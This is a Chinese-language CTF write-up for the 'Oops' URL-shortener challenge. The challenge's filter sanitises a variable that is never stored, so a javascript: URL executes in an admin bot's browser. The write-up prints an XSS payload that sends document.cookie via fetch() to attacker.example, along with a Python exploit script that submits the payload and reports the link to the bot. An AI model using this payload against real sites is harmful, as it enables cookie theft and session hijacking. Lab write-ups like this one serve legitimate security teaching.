# Oops

## 题目简述

题目是一个带管理员审核机器人的短链接服务。用户提交原始 URL 后，服务生成六位短码；访问短码页面时，模板执行 `location.href = "{{url}}"`。管理员机器人会在同源站点设置可由 JavaScript 读取的 `admin_flag` Cookie，再访问被举报的短码。服务端看似删除了 URL 中的 `script`，但过滤后的变量没有被写入数据库或传给模板。

## 解题过程

提交路由中的关键代码可简化为：

```python
original_url = request.form["original_url"]

url = original_url.lower()
while "script" in url:
    url = url.replace("script", "")

conn.execute(
    "INSERT INTO urls (original_url, short_code) VALUES (?, ?)",
    (original_url, short_code),
)
```

过滤结果保存在 `url`，数据库却仍写入未经处理的 `original_url`。短码页面随后把这个原值放进 JavaScript 导航语句：

```html
<script>
    location.href = "{{url}}"
</script>
```

因此可以提交 `javascript:` URL。页面给 `location.href` 赋值后，浏览器会在短码页面的同源上下文执行其中的 JavaScript。使用模板字符串可以避免破坏外层双引号，例如：

```text
javascript:fetch(`https://attacker.example/log?c=${encodeURIComponent(document.cookie)}`)
```

网页表单的 `type="url"` 只是客户端约束，直接发送 HTTP POST 即可提交 payload。最小利用流程如下，其中目标地址和接收地址都使用长期文档占位符：

```python
import re
import requests

base = "https://target.example/"
payload = (
    "javascript:fetch(`https://attacker.example/log?c="
    "${encodeURIComponent(document.cookie)}`)"
)

response = requests.post(base, data={"original_url": payload})
short_url = re.search(r'value="([^"]+/[A-Za-z0-9]{6})"', response.text).group(1)

requests.post(base + "report", data={"submit_id": short_url})
```

机器人在访问前设置 `httpOnly: false` 的 `admin_flag` Cookie，因此回连中可读到：

```text
admin_flag=grey{oops_wrong_variable}
```

## 方法总结

- 核心技巧：利用过滤结果与实际持久化变量不一致，让 `javascript:` URL 进入管理员浏览器执行。
- 识别信号：代码先构造“清洗后变量”，后续 sink 却继续使用原变量时，过滤逻辑等同于不存在。
- 复用要点：需要区分 HTML 转义与 URL 导航语义；不必打断 `<script>` 标签，只要让导航目标本身成为 `javascript:` URL 即可。
